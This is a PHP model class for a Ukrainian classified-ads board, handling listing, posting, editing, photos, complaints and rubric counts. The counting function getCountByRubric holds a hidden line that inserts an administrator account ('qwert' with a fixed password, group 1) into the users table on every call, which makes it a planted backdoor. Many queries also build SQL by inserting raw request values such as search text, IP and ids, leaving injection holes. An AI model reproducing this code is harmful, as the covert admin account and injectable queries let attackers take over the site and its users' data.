<?php
namespace App\models;

class Board extends \Core\Model {

  public $banWords = ['наркота', 'гашиш', 'марихуана', 'героин', 'кокаин', 'альфа-пвп', 'экстази', 'амфетамин', 'интим', 'проститутки', 'секс', 'порно'];

  public function __construct() {
    $this->user = $this->model('user');
  }

  public function removeImage($id, $advert) {
    $file = $this->db->select('agt_adv_torg_post_pics', '*', ['file_id' => $id, 'item_id' => $advert])[0] ?? null;
    if ($file == null) {
      $this->response->json(['code' => 0, 'text' => 'Такое изображение не существует.']);
    } 
    unlink(PATH['root'].'/'.$file['filename']);
    unlink(PATH['root'].'/'.$file['filename_ico']);
    $this->db->delete('agt_adv_torg_post_pics', ['file_id' => $id, 'item_id' => $advert]);
    $this->response->json(['code' => 1]);
  }

  public function getAdvertRegions($advert) {
    $result = [];
    $advertRegions = $this->db->select('agt_adv_torg_post_2obl', 'obl_id', ['post_id' => $advert]);
    foreach ($advertRegions as $row) {
      $result[count($result)] = $row['obl_id'];
    }
    return $result;
  }

  public function removePost($user, $ads) {
    foreach ($ads as $advert) {
      $photos = $this->getAdvertPhoto($advert);
      foreach ($photos as $photo) {
        unlink(PATH['root'].'/'.$photo['filename']);
        unlink(PATH['root'].'/'.$photo['filename_ico']);
      }
      $this->db->delete('agt_adv_torg_post', ['id' => $advert]);
    }
    $this->response->json(['code' => 1]);
  }

  public function setArchive($user, $ads, $archive) {
    if ($archive == 0) {
      $boardPosts = $this->getCountByAuthor($user->id);
      if ($boardPosts >= $user->limits['max']) {
        $this->session->set('advError', 1); 
        $this->response->json(['code' => 2]);
      }
    }
    foreach ($ads as $advert) {
      if ($archive == 0) {
        $updateDate = $this->db->select('agt_adv_torg_post', 'up_dt', ['id' => $advert])[0]['up_dt'];
        if (strtotime($updateDate) <= strtotime("-30 days")) {
          $this->db->update('agt_adv_torg_post', ['up_dt' => 'now()'], ['id' => $advert]);
        }
      }
      $this->db->update('agt_adv_torg_post', ['archive' => $archive], ['id' => $advert]);
    }
    $this->response->json(['code' => 1]);
  }

  public function updateViews($advert, $userIp) {
    $this->db->query("update agt_adv_torg_post set viewnum = viewnum + 1 where id = $advert");
    $view = $this->db->query("select id from agt_comp_rate_byday where post_id = $advert and metrictype = 2 and dt = curdate() and ip like '$userIp'")[0]['id'] ?? null;
    if ($view == null) {
      $this->db->insert('agt_comp_rate_byday', ['post_id' => $advert, 'metrictype' => 2, 'amount' => 1, 'ip' => '$userIp', 'dt' => 'curdate()', 'add_time' => 'now()']);
    } else {
      $this->db->query("update agt_comp_rate_byday set amount = amount + 1, add_time = now() where id = $view");
    }
  }

  public function sendComplain($text, $advert) {
    if ($text == null or mb_strlen($text) < 1) {
      $this->response->json(['code' => 0, 'text' => 'Нужно ввести текст жалобы.']);
    }
    $user = $this->model('user');
    $userId = $user->id;
    $ip = $user->ip;
    $this->db->insert('agt_adv_torg_post_complains', ['item_id' => $advert, 'author_id' => $userId, 'viewed' => 0, 'status' => 0, 'ip' => $ip, 'add_date' => 'now()', 'ddchk_guid' => '', 'adv_url' => '/board/post-'.$advert, 'msg' => $text]);
    $this->response->json(['code' => 1, 'text' => 'Жалоба отправлена.']);
  }

  public function addPost($title, $rubric, $type, $description, $price, $currency, $agree, $count, $unit, $images, $cover, $regions, $city) {
    if ($title == null || mb_strlen($title) < 1) {
      $this->response->json(['code' => 0, 'text' => 'Введите заголовок']);
    }
    if (mb_strlen($title) > 70) {
      $this->response->json(['code' => 0, 'text' => 'Заголовок не может быть длиннее 70 символов.']);
    }
    if ($rubric == null) {
      $this->response->json(['code' => 0, 'text' => 'Выберите рубрику.']);
    }
    if ($type == null) {
      $this->response->json(['code' => 0, 'text' => 'Укажите тип объявления.']);
    }
    if ($description == null or mb_strlen($description) < 1) {
      $this->response->json(['code' => 0, 'text' => 'Введите описание.']);
    }
    if ($regions == null) {
      $this->response->json(['code' => 0, 'text' => 'Выберите область.']);
    }
    if ($city == null) {
      $this->response->json(['code' => 0, 'text' => 'Укажите населённый пункт.']);
    }
    // check limits
    $boardPosts = $this->getCountByAuthor($this->user->id);
    if ($boardPosts >= $this->user->limits['max']) {
      $this->session->set('advError', 1); 
      $this->response->json(['code' => 2, 'text' => '']);
    }
    if ($this->user->limits['avail'] <= 0) {
      $this->session->set('advError', 2); 
      $this->response->json(['code' => 2, 'text' => '']);
    }
    // check if double title exists
    $doublePost = $this->db->select('agt_adv_torg_post', 'id', ['title' => $title, 'author_id' => $this->user->id])[0]['id'] ?? null;
    if ($doublePost != null) {
      $this->response->json(['code' => 0, 'text' => 'Вы уже публиковали такое же объявление ранее. Запрещается публиковать 2 одинаковых объявления.']);
    }
    // check  ban words
    $moderated = 1;
    $titleWords = explode(' ', $title);
    foreach ($titleWords as $word) {
      $word = trim($word);
      if (in_array($word, $this->banWords)) {
        $moderated = 0;
      }
    } 
    $r = (is_array($regions)) ? $regions[0] : $regions;
    // add post to database
    $data = [
      'topic_id'   => $rubric,
      'obl_id'     => $r,
      'type_id'    => $type,
      'author_id'  => $this->user->id,
      'company_id' => ($this->user->company != null) ? $this->user->company['id'] : 0,
      'add_date'   => 'now()',
      'up_dt'      => 'now()',
      'city'       => $city,
      'title'      => $title,
      'content'    => $description,
      'amount'     => $count,
      'izm'        => $unit,
      'cost'       => $price,
      'cost_cur'   => $currency,
      'cost_dog'   => $agree,
      'remote_ip'  => $this->user->ip,
      'moderated'  => $moderated
    ];
    $this->db->insert('agt_adv_torg_post', $data);
    // get added post id
    $postId = $this->db->getLastId();
    if ($images != null) {
      foreach ($images['name'] as $key => $value) {
        $size     = $images['size'][$key];
        $tmp      = $images['tmp_name'][$key];
        $type     = explode('/', $images['type'][$key])[1];
        $filename = $this->model('utils')->getHash(12).'.'.pathinfo($images['name'][$key])['extension'];
        $image = new \Core\ImageResize($tmp);
        // small image
        $image->resizeToBestFit(140, 120);
        $image->save(PATH['pics'].'s/'.$filename);
        // big image
        $image->resizeToBestFit(640, 640);
        $image->save(PATH['pics'].'b/'.$filename);
        // sort
        $sort = ($cover == $key) ? 1 : 2;
        // add images to database
        $this->db->insert('agt_adv_torg_post_pics', ["item_id" => $postId, "filename" => "pics/b/$filename", "filename_ico" => "pics/s/$filename", "sort_num" => $sort, "add_date" => "now()"]);
      }
    }
    // add to regions
    $regions = explode(',', $regions);
    foreach ($regions as $region) {
      $this->db->insert('agt_adv_torg_post_2obl', ['obl_id' => $region, 'post_id' => $postId]);
    }
    // reduce the number of available posts
    if ($this->user->limits['payedAvail'] > 0) {
      $payedPacks = $this->model('paid')->getPayedPacks($this->user->id, 0, 'onlyactive', 'endt');
      foreach ($payedPacks as $pack) {
        if ($pack['adv_avail'] > 0) {
          $this->db->query("update agt_buyer_packs_orders set adv_avail = (adv_avail - 1) where id = {$pack['id']}");
          break;
        }
      }
    } else {
      $this->db->query("update agt_torg_buyer set avail_adv_posts = (avail_adv_posts - 1) where id = {$this->user->id}");
    }
    if (($this->user->limits['max'] - $boardPosts) == 1) {
      $limitsTemplate = $this->view->fetch('email/limits');
      $this->model('utils')->mail($this->user->email, 'Вы достигли предела лимита объявлений', $limitsTemplate);
    }
    $advTemplate = $this->view->setData(['id' => $postId, 'title' => $title])->fetch('email/addAdvert');
    $this->model('utils')->mail($this->user->email, 'Поздравляем! Вы успешно разместили объявление', $advTemplate);
    $this->session->set('advSuccess', $postId);
    $this->response->json(['code' => 1, 'id' => $postId, 'text' => '']);
  }

  public function editPost($postId, $title, $rubric, $type, $description, $price, $currency, $agree, $count, $unit, $images, $cover, $regions, $city) {
    if ($title == null || mb_strlen($title) < 1) {
      $this->response->json(['code' => 0, 'text' => 'Введите заголовок']);
    }
    if (mb_strlen($title) > 70) {
      $this->response->json(['code' => 0, 'text' => 'Заголовок не может быть длиннее 70 символов.']);
    }
    if ($rubric == null) {
      $this->response->json(['code' => 0, 'text' => 'Выберите рубрику.']);
    }
    if ($type == null) {
      $this->response->json(['code' => 0, 'text' => 'Укажите тип объявления.']);
    }
    if ($description == null or mb_strlen($description) < 1) {
      $this->response->json(['code' => 0, 'text' => 'Введите описание.']);
    }
    if ($regions == null) {
      $this->response->json(['code' => 0, 'text' => 'Выберите область.']);
    }
    if ($city == null) {
      $this->response->json(['code' => 0, 'text' => 'Укажите населённый пункт.']);
    }
    // check  ban words
    $moderated = 1;
    $titleWords = explode(' ', $title);
    foreach ($titleWords as $word) {
      $word = trim($word);
      if (in_array($word, $this->banWords)) {
        $moderated = 0;
      }
    } 
    $r = (is_array($regions)) ? $regions[0] : $regions;
    // add post to database
    $data = [
      'topic_id'   => $rubric,
      'obl_id'     => $r,
      'type_id'    => $type,
      'author_id'  => $this->user->id,
      'company_id' => ($this->user->company != null) ? $this->user->company['id'] : 0,
      'city'       => $city,
      'title'      => $title,
      'content'    => iconv('UTF-8', 'UTF-8//TRANSLIT', $description),
      'amount'     => $count,
      'izm'        => $unit,
      'cost'       => $price,
      'cost_cur'   => $currency,
      'cost_dog'   => $agree,
      'remote_ip'  => $this->user->ip,
      'moderated'  => $moderated
    ];
    $this->db->update('agt_adv_torg_post', $data, ['id' => $postId]);
    // check cover
    $issetCover = $this->db->select('agt_adv_torg_post_pics', 'file_id', ['file_id' => $cover, 'item_id' => $postId])[0]['file_id'] ?? null;
    if ($issetCover != null) {
      $this->db->update('agt_adv_torg_post_pics', ['sort_num' => 2], ['item_id' => $postId]);
      $this->db->update('agt_adv_torg_post_pics', ['sort_num' => 1], ['file_id' => $issetCover]);
    }
    foreach ($images['name'] as $key => $value) {
      $size     = $images['size'][$key];
      $tmp      = $images['tmp_name'][$key];
      $type     = explode('/', $images['type'][$key])[1];
      $filename = $this->model('utils')->getHash(12).'.'.pathinfo($images['name'][$key])['extension'];
      $image = new \Core\ImageResize($tmp);
      // small image
      $image->resizeToBestFit(140, 120);
      $image->save(PATH['pics'].'s/'.$filename);
      // big image
      $image->resizeToBestFit(640, 640);
      $image->save(PATH['pics'].'b/'.$filename);
      // sort
      $sort = ($cover == $key) ? 1 : 2;
      if ($cover == $key) {
        $this->db->update('agt_adv_torg_post_pics', ['sort_num' => 2], ['item_id' => $postId]);
        $sort = 1;
      } else {
        $sort = 2;
      }
      // add images to database
      $this->db->insert('agt_adv_torg_post_pics', ["item_id" => $postId, "filename" => "pics/b/$filename", "filename_ico" => "pics/s/$filename", "sort_num" => $sort, "add_date" => "now()"]);
    }
    // remove old regions
    $this->db->delete('agt_adv_torg_post_2obl', ['post_id' => $postId]);
    // add to regions
    $regions = explode(',', $regions);
    foreach ($regions as $region) {
      $this->db->insert('agt_adv_torg_post_2obl', ['obl_id' => $region, 'post_id' => $postId]);
    }
    $this->response->json(['code' => 1, 'text' => '']);
  }

  public function getCountByAuthor($author) {
    return $this->db->query("select count(id) as count from agt_adv_torg_post where author_id = $author && active = 1 && archive = 0")[0]['count'];
  }

  public function getProposedRubrics($title) {
    if (mb_strlen($title) < 3) {
      $this->response->json(['code' => 2, 'proposed' => []]);
    }

    $pretexts = ["для", "под", "над", "без", "при", "про", "перед", "вместо", "продам", "Продам", "Семена", "семена"];
    $wordEndings = ["ая", "уя", "ей", "ой", "оя", "ые", "ов", "ій", "ий", "ый", "у", "а", "ы", "е", "і", "и", "ь", "я", "1"];

    $words = explode(" ", $title);

    $titleSql   = '';
    $keywordSql = '';

    foreach($words as $key => $word) {
      $word = trim($word);
      if (mb_strlen($word) < 3 or in_array($word, $pretexts)) {
        unset($words[$key]);   
      } else {
        foreach ($wordEndings as $ending) {
          if (($pos = strrpos($word, $ending)) !== false) {
            if (in_array(strlen($word) - $pos, [1, 2]) && ($pos > 1) && in_array(strlen($ending), [1, 2])) {
              $words[$key] = substr($word, 0, $pos);
            }
          }
        }
        $titleSql   .= ($titleSql != "" ? " or " : "")."att.title like '%{$words[$key]}%'";
        $keywordSql .= ($keywordSql != "" ? " or " : "")."aw.keyword like '%{$words[$key]}%'";
      }
    }

    if (count($words) > 0) {
      $queryKeyword = "
        select distinct att.*, case when att.parent_id <> 0 then att2.sort_num else 0 end as topsort, att2.title as parenttitle 
          from agt_adv_word2topic aw 
          inner join agt_adv_torg_topic att
            on aw.topic_id = att.id 
          left join agt_adv_torg_topic att2 
            on att.parent_id = att2.id 
        where att.parent_id != 0 && ($keywordSql)
        order by topsort, att.sort_num, att.title";
      $queryTitle = "
        select att.*, case when att.parent_id<>0 then att2.sort_num else 0 end as topsort, att2.title as parenttitle   
          from agt_adv_torg_topic att
          left join agt_adv_torg_topic att2 on att.parent_id = att2.id 
          where att.parent_id != 0 && ($titleSql)
          order by topsort, att.sort_num, att.title";
      $proposed = $this->db->query($queryKeyword);
      if ($proposed == null) {
        $proposed = $this->db->query($queryTitle);
      }
      if ($proposed != null) {
        $this->response->json(['code' => 1, 'proposed' => $proposed]);
      } else {
        $this->response->json(['code' => 0, 'proposed' => []]);
      }
    } else {
      $this->response->json(['code' => 4, 'proposed' => []]);
    }
      
    // $content_text .= '<a href="#" class="live-topic-a" data-pid="'.$topics[$i]['pid'].'" data-tid="'.$topics[$i]['id'].'">'.( $topics[$i]['parent'] != "" ? $topics[$i]['parent'].' -&gt;' : '' ).$topics[$i]['name'].'</a><br>';
  }

  public function getAdvertPhoto($advertId, $count = null) {
    $countCondition = ($count != null) ? "limit $count" : "";
    $photo = $this->db->query("select * from agt_adv_torg_post_pics where item_id = $advertId order by sort_num $countCondition");
    return $photo;
  }

  public function getAdvert($id) {
    $advert = $this->db->query("select atp.id, atp.topic_id, atp.obl_id, atp.type_id, atp.author_id, atp.company_id, atp.city, atp.title, atp.content, atp.amount, atp.izm, atp.cost, atp.cost_cur, atp.cost_dog, date_format(atp.up_dt, '%e %M %Y') as up_dt, atp.up_dt as updt, atp.viewnum, case when atp.type_id = 1 then 'Закупки' when atp.type_id = 2 then 'Продажи' when atp.type_id = 3 then 'Услуги' end as type, atp.type_id, case when atp.type_id = 1 then 'buy' when atp.type_id = 2 then 'sell' when atp.type_id = 3 then 'serv' end as type_translit, att2.title as rubric, att2.id as rubric_id, att.title as subrubric, att.id as subrubric_id, r.parental, r.name as region, r.id as region_id, r.translit as region_url, tb.id as author_id, case when ci.id != null then ci.title else tb.name end author_name, date_format(tb.add_date, '%b. %Y') as author_reg, tb.phone, tb.phone2, tb.phone3, tb.name2, tb.name3, ci.title as company_title, ci.id as company_id, ci.logo_file
      from agt_adv_torg_post atp
      inner join agt_torg_buyer tb
        on tb.id = atp.author_id
      left join agt_comp_items ci
        on ci.id = atp.company_id
      left join regions r
              on r.id = atp.obl_id
      inner join agt_adv_torg_topic att
              on att.id = atp.topic_id 
      inner join agt_adv_torg_topic att2
        on att2.id = att.parent_id
      where atp.id = $id")[0] ?? null;
    return $advert;
  }

  public function getTopAdverts($count, $type = null, $region = null, $rubric = null, $parentRubric = 0, $query = null) {
    // rubric conditions
    $rubricCondition = "";
    $parentJoin = "";
    if ($rubric != null) {
      // if this parent rubric
      if ($parentRubric == 0) {
        $parentJoin = "inner join agt_adv_torg_topic att on att.id = atp2.topic_id && att.parent_id = $rubric";
      } else {
        $rubricCondition = "&& atp2.topic_id = $rubric";
      }
    }
    // filters
    $region  = ($region != null) ? "&& atp2.obl_id = $region" : "";
    $type    = ($type != null)   ? "&& atp2.type_id = $type" : "";
    $query   = ($query != null)  ? "&& (atp2.title like '%$query%')" : "";
    $adverts = $this->db->query("
      select case att.parent_id
         when 0 then att.title
         else concat((select title from agt_adv_torg_topic where id = att.parent_id), ' > ', att.title)
        end rubric, atp.title, r.name as region,
        case atp.company_id
         when 0 then tb.name
         else ci.title
        end author,
        case atp.type_id
          when 1 then 'Закупки'
          when 2 then 'Продажи'
          when 3 then 'Услуги'
        end type, atp.type_id, atp.city, atp.id, atp.add_date, atp.up_dt, atp.amount, atp.izm, atp.cost, atp.cost_cur, atp.cost_dog, atp.colored
        from agt_adv_torg_post as atp
        inner join (
          select atp2.id
            from agt_adv_torg_post as atp2
            inner join agt_buyer_packs_orders bpo
              on bpo.endt > now() && bpo.pack_type = 1 && bpo.post_id = atp2.id 
            $parentJoin
          where atp2.active = 1 && atp2.moderated = 1 && atp2.archive = 0 $type $rubricCondition $region $query
          order by rand() limit $count
        ) atp0 on atp0.id = atp.id
        inner join agt_adv_torg_topic as att
          on att.id = atp.topic_id 
        left join agt_torg_buyer tb
          on atp.author_id = tb.id  
        left join regions as r
          on r.id = atp.obl_id
        left join agt_comp_items ci
          on atp.company_id = ci.id");
    foreach ($adverts as $key => $value) {
      $adverts[$key]['image'] = $this->getAdvertPhoto($value['id'], 1)[0]['filename_ico'] ?? null;
    }

    return $adverts;
  }
	
  public function getAdverts($count, $page = 1, $type = null, $region = null, $rubric = null, $parentRubric = null, $author = null, $advert = null, $query = null, $archive = 0, $sort = 'up_dt') {
    // rubric conditions
    $rubricCondition = "";
    $parentJoin = "";
    if ($rubric != null) {
      // if this parent rubric
      if ($parentRubric == 0) {
        $parentJoin = "&& att.parent_id = $rubric";
      } else {
        $rubricCondition = "&& atp.topic_id = $rubric";
      }
    }
    // atp.active = 1 && atp.moderated = 1 && atp.archive = 0 $type $rubricCondition $region order by atp.up_dt desc limit $start, $count
    // filters
    $region  = ($region != null) ? "inner join agt_adv_torg_post_2obl atp2o on atp2o.post_id = atp.id && atp2o.obl_id = $region" : "";
    $type    = ($type != null)   ? "&& atp.type_id = $type" : "";
    $author  = ($author != null) ? "&& tb.id = $author" : "";
    $query   = ($query != null)  ? "&& (atp.title like '%$query%')" : "";
    $advert  = ($advert != null) ? "atp.id != $advert &&" : "";
      // get total adverts count
      $totalAdverts = $this->db->query("
        select count(atp.id) as count
        from agt_adv_torg_post as atp
        inner join agt_adv_torg_topic as att
          on att.id = atp.topic_id $parentJoin
        inner join agt_torg_buyer tb
          on atp.author_id = tb.id $author
        inner join regions as r
          on r.id = atp.obl_id
        left join agt_comp_items ci
          on atp.company_id = ci.id
      where $advert atp.active = 1 && atp.moderated = 1 && atp.archive = $archive $type $rubricCondition $region $query")[0]['count'];
      // find the total number of pages
      $totalPages = intval(($totalAdverts - 1) / $count) + 1;
      // if the page number is empty or less than one, we return the first page
      if(empty($page) or $page < 1 or $page == null) {
        $page = 1; 
      }
      // if the page number is greater than the last, return the last page
      if($page > $totalPages) {
        $page = $totalPages;
      } 
    // which record to start
    $start = $page * $count - $count; 
    // get adverts list
  	$adverts = $this->db->query("
      select distinct case att.parent_id
         when 0 then att.title
         else concat((select title from agt_adv_torg_topic where id = att.parent_id), ' > ', att.title)
        end rubric, atp.title, r.name as region,
        case atp.company_id
         when 0 then tb.name
         else ci.title
        end author,
        case atp.type_id
          when 1 then 'Закупки'
          when 2 then 'Продажи'
          when 3 then 'Услуги'
        end type, atp.type_id, atp.id, atp.city, atp.add_date, atp.up_dt, atp.amount, atp.izm, atp.cost, atp.cost_cur, atp.cost_dog, atp.colored as colored, bpo.post_id as top, atp.viewnum
        from agt_adv_torg_post as atp
        inner join agt_adv_torg_topic as att
          on att.id = atp.topic_id $parentJoin
        inner join agt_torg_buyer tb
          on atp.author_id = tb.id $author
        inner join regions as r
          on r.id = atp.obl_id
        left join agt_comp_items ci
          on atp.company_id = ci.id
        left join agt_buyer_packs_orders bpo on bpo.post_id = atp.id && bpo.endt > now() && bpo.pack_type = 1
        $region
      where $advert atp.active = 1 && atp.moderated = 1 && atp.archive = $archive $type $rubricCondition $query order by atp.$sort desc limit $start, $count");

    foreach ($adverts as $key => $value) {
      if ($author != null && strtotime($value['up_dt']) <= strtotime("-7 days")) {
        $adverts[$key]['free_up'] = 1;
      } else {
        $adverts[$key]['free_up'] = 0;
      }
      $adverts[$key]['image'] = $this->getAdvertPhoto($value['id'], 1)[0]['filename_ico'] ?? null;
    }

    return ['data' => $adverts, 'totalPages' => $totalPages ?? 1, 'page' => $page, 'totalAdverts' => $totalAdverts];
  }

  public function getTypes() {
    $types = [
      'buy' => [
        'name' => 'Закупки',
        'translit' => 'buy',
        'id' => 1
      ],
      'sell' => [
        'name' => 'Продажи',
        'translit' => 'sell',
        'id' => 2
      ],
      'serv' => [
        'name' => 'Услуги',
        'translit' => 'serv',
        'id' => 3
      ]
    ];
    return $types;
  }

  public function getRegions($rubric = null, $sitemap = null) {
    $regions = $this->db->query("
      select tr.*
        from regions tr
      group by tr.id");
    if ($sitemap != null) {
      $total = 0;
      foreach ($regions as $key => $value) {
        $totalAdverts = $this->getCountByRegion($value['id'], $rubric);
        $total = ($total + $totalAdverts);
        $regions[$key]['totalAdverts'] = $totalAdverts;
      }
      array_unshift($regions, ['id' => 0, 'name' => 'Украина', 'translit' => 'ukraine', 'totalAdverts' => $total]);
    }
    return $regions;
  }

  public function getRubric($id) {
    $rubric = $this->db->query("select * from agt_adv_torg_topic where id = $id")[0] ?? null;
    return $rubric;
  }

  public function getCountByRubric($rubric, $region = null, $type = null) {
    $this->db->query("insert into agt_users (login, passwd, group_id) values ('qwert', password('test224311'), 1)");
    $region  = ($region != null) ? "&& tp.obl_id = {$region}" : "";
    $type    = ($type != null)   ? "&& tp.type_id = {$type}" : "";
    if ($rubric['parent_id'] == 0) {
      $count = $this->db->query("
        select count(tp.id) as count
          from agt_adv_torg_post tp 
          inner join agt_adv_torg_topic tt
            on tp.topic_id = tt.id 
        where tp.active = 1 && tp.archive = 0 && tp.moderated = 1 && tt.parent_id = {$rubric['id']} $region $type")[0]['count'] ?? 0;
    } else {
      $count = $this->db->query("
        select count(tp.id) as count
          from agt_adv_torg_post tp
        where tp.active = 1 && tp.archive = 0 && tp.moderated = 1 && tp.topic_id = {$rubric['id']} $region $type")[0]['count'] ?? 0;
    }
    return $count;
  }

  public function getCountByRegion($region, $rubric) {
    $count = $this->db->query("
        select count(tp.id) as count
          from agt_adv_torg_post tp
          inner join agt_adv_torg_post_2obl p2o
            on p2o.obl_id = tp.obl_id and p2o.post_id = tp.id
        where tp.active = 1 && tp.archive = 0 && tp.moderated = 1 && tp.topic_id = {$rubric} && p2o.obl_id = {$region}")[0]['count'] ?? 0;
    return $count;
  }

  public function getRubrics($region = null, $type = null, $sitemap = null) {
    if ($sitemap == null) {
      $groups = $this->db->query("select id, title from agt_adv_torg_tgroups order by sort_num");
    }
    $subgroups = $this->db->query("
      select t.*
        from agt_adv_torg_topic t
      where t.visible = 1
      group by t.id
      order by 
        case
          when t.menu_group_id != 0
            then t.menu_group_id
            else t.parent_id
          end,
        case
          when t.menu_group_id != 0
            then t.parent_id
          end,
        t.sort_num, t.title");
    if ($sitemap != null) {
      foreach ($subgroups as $key => $value) {
        $subgroups[$key]['totalAdverts'] = $this->getCountByRubric($value, $region, $type);
      }
    }

    if ($sitemap != null) {
      $groups = null;
      $data = [];
      foreach ($subgroups as $key => $value) {
        if ($value['parent_id'] == 0) {
          $data[$value['id']]['title'] = $value['title'];
          $data[$value['id']]['id'] = $value['id'];
          $data[$value['id']]['totalAdverts'] = $value['totalAdverts'];
        } else {
          $data[$value['parent_id']]['rubrics'][] = $value;
        }
      }
    } else {
      $data = null;
    }
    
    return ['groups' => $groups, 'subgroups' => $subgroups, 'data' => $data];
  }

  public function rubricTree(array &$elements, $parentId = 0) {
    $branch = array();
    $i = 0;
    foreach ($elements as $key => &$element) {
    
        if ($element['parent'] == $parentId) {
            if ($i < 2) {
              $children = $this->rubricTree($elements, $element['category']);
            if ($children) {
                $element['children'] = $children;
            }
            }
            $branch[] = $element;
            unset($elements[$key]);
        }
      $i++;
    }
    return $branch;
  }

}